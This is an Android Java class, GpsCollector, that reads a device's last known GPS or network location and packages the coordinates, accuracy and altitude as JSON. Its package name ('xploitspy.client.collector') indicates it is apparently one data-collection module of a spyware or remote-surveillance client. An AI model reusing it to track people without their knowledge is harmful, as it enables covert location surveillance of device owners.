package com.xploitspy.client.collector;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;
import org.json.JSONObject;

/**
 * GpsCollector - Mengumpulkan data GPS
 */
public class GpsCollector {
    
    private static final String TAG = "GpsCollector";
    private Context context;
    private LocationManager locationManager;
    
    public GpsCollector(Context context) {
        this.context = context;
        this.locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
    }
    
    public JSONObject collect() {
        try {
            Location location = getLastKnownLocation();
            if (location != null) {
                JSONObject gpsData = new JSONObject();
                gpsData.put("latitude", location.getLatitude());
                gpsData.put("longitude", location.getLongitude());
                gpsData.put("accuracy", location.getAccuracy());
                gpsData.put("altitude", location.getAltitude());
                return gpsData;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error collecting GPS data", e);
        }
        return null;
    }
    
    private Location getLastKnownLocation() {
        Location location = null;
        
        try {
            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            }
            
            if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Permission denied for location", e);
        }
        
        return location;
    }
}

